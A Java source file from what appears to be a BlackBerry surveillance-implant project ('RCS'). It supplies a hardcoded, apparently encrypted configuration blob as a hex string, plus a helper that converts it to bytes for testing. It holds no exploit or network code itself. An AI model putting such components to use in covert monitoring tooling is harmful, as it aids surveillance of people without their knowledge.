//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package fake;

import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;

public class InstanceConfigFake {
    //#ifdef FAKECONF
     
    //polluce 1
    //824
    static String configString = "00000000000000002db62bc906043b20174e93ce397774e4f0786832d6e7d5f7601c322f55edf7c43b61257a947847b03e9167b1b96416ff9d8d94675a843bcfb8d6b4433de798645fb0d3f2349da947df4a439bdca7fdd225aa368d896628555c718571b1b2c202c5010798090b0856001f52a401d89427142c2430c0dadc20a7bde1098437f7529740128c1f124d7d4bb3f7b675d75d5e36ce9c691583039cd0f2e3ade6a53929d896fa774e88faf02cd59870f070e77d5145d4070324848b8fbeed679bf3666595ae92d4a6b346298177ca1c76dcbd6ab9013659bae2ffcce4d22014a92717dd2b8b10143de8dd27a69e473979ffb5d63a12e18bcbdc8020d61ca793a5034cd53f0d2973f821d8af1b57e1250eccb39d89ea9ed678284a64d85cff5ae51e71b5cd23c6790366f62b56dbafa5df3c70b594daa79b9e94797158d19ce0a3582c570e5ece16b3dd7e8ba1b33d0623ebee8ffb08059178cd198ce56b66cfbdb71287413ed8943836a62c864db7d882b48f4d5a33b0b9d9548ce6c5431badf75f1d97938e68d41fb1d72547e797d5d3528887a6e4a4b5f11709389fb2a1017579662ca85c26764470ea366b7175ee317669c7874b0854a735db22cbe6aebc9e98640475a37ebf4a340b33a227ae8b634e984da0b86ba5dca66a23dcd53b500d5f07e5a7dc18bbe8843eb6bfd01383a1bfac38cf20e20b85e840021df367f031bf82b22b890334991f62df414f8de3e0a680abb25de2fb0c1b25b39ca31f313d55c8caf4b0fa06421535205910ba7efd81099bcbe314907810fab19f960124068648d68d2c219687a66ea2a9b91d3c8aff0209d9e269082dbc689a6d34ec9c846c6b557cc0b33e5f5a1d522ea2d78bc2882d5aa697d7e7dfbe75c946efeda56e3a194f51c892d5e4635f777eaaf3235663bc2e2e6782d8c06d1fb64333f2f36ed031a18a7e0f2cd6f7edad5a08e9fd852803f429d507fd7b4ff2d3f0b118bab57dfa9fc76ce77ffd4eafaadb10774efdfb1b373b742daa0fa266acafddeed5a1ac8c50dfa16a8e5b0da7d8fbcb07ea16fb555e200b30f54ed8983fd4e1a79493ef95487519fa211f88a648f6c4227cbc28cd510704ed94ab78e51f52ecfaaaea0452fec236ba5821aa445e835d7278121d96f640e854bbc041a2d54846f1900aebfd6e75bf3d891cac9d31de67b8ab8365c43828a86f7429c7ba5892925bd442b82c91";
    static byte[] config;
    
    public int version = 2;

    public static byte[] getBytes() {        
        config = hexStringToByteArray(configString);        
        return config;
    }
    
    /**
     * Hex string to byte array.
     * 
     * @param wchar
     *            the wchar
     * @return the byte[]
     */
    public static byte[] hexStringToByteArray(final String config) {
        int offset = 4;
        int len = config.length() / 2;
        final byte[] ret = new byte[ len + 4];

        for (int i = offset; i < ret.length; i++) {
            final char first = config.charAt((i - offset) * 2);
            final char second = config.charAt((i - offset) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }
        
        final DataBuffer databuffer = new DataBuffer(ret, 0, 4, false);
        databuffer.writeInt(len);

        return ret;
    }
    
    //#else
    public static byte[] getBytes() {        
        return null;
    }
  //#endif
}

